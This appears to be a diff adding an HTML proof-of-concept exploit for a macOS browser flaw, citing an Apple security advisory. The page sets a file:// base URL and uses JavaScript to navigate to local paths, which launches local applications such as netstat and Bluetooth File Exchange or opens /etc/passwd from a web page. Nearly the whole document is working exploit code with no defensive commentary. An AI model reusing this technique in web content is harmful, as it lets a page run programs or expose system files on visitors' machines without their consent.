@@ -1,0 +1,25 @@
+<html>
+<head>
+<base href="file://">
+<script>
+ function DoIt() {
+  alert(document.getElementById("cmdToRun").value);
+  document.location=document.getElementById("cmdToRun").value;
+ }
+</script>
+</head>
+<body>
+<select id="cmdToRun">
+ <option value="/usr/sbin/netstat">Launch /usr/bin/netstat</option>
+ <option value="/etc/passwd">Launch /etc/passwd</option>
+ <option value="/Applications/Utilities/Bluetooth File Exchange.app">
+Launch Bluetooth File Exchange.app</option>
+</select>
+<br />
+<input type=button value="Launch" onclick="DoIt()">
+<br />
+</body>
+</html>
+
+
+Apple's advisory: http://support.apple.com/kb/HT5000
